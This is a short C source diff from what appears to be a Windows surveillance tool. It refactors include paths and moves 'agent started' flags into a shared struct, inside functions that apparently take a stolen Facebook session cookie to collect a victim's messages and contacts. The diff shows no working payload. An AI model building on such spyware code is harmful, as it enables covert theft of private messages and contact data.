@@ -1,8 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 #include <time.h>
-#include "..\common.h"
-#include "..\LOG.h"
+#include "../common.h"
+#include "../bss.h"
+#include "../LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
@@ -35,9 +36,6 @@
 #define FACEBOOK_THREAD_LIMIT 15
 #define MAX_FACEBOOK_ACCOUNTS 500 
 #define FB_INVALID_TSTAMP 0xFFFFFFFF
-
-extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
-extern BOOL bPM_ContactsStarted; 
 
 extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
@@ -151,7 +149,7 @@ DWORD HandleFBMessages(char *cookie)
 
 	CheckProcessStatus();
 
-	if (!bPM_IMStarted)
+	if (!shared.bPM_IMStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 	
 	// Identifica l'utente
@@ -480,7 +478,7 @@ DWORD HandleFBContacts(char *cookie)
 
 	CheckProcessStatus();
 
-	if (!bPM_ContactsStarted)
+	if (!shared.bPM_ContactsStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	if (scanned)
